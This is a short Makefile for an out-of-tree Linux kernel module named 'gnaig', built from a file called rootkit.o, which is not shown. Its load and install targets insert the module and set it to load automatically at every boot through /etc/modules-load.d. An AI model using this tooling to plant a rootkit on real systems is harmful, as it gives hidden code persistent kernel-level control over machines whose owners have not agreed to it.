modname := gnaig
obj-m := $(modname).o

$(modname)-objs := rootkit.o

KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

ifdef DEBUG
CFLAGS_$(obj-m) := -DDEBUG
endif

all: module

clean:
	make -C $(KDIR) M=$(PWD) clean

module:
	make -C $(KDIR) M=$(PWD) modules

load:
	-rmmod $(modname)
	insmod $(modname).ko

unload:
	-rmmod $(modname)

install:
	mkdir -p /lib/modules/$(KVERSION)/kernel/drivers/$(modname) &
	install -m 0755 -o root -g root $(modname).ko /lib/modules/$(KVERSION)/kernel/drivers/$(modname) & 
	echo "$(modname)" > /etc/modules-load.d/$(modname).conf &
	depmod -a

uninstall:
	rm /lib/modules/$(KVERSION)/kernel/drivers/$(modname)/$(modname).ko &
	rmdir /lib/modules/$(KVERSION)/kernel/drivers/$(modname) &
	rm /etc/modules-load.d/$(modname).conf &
	depmod -a
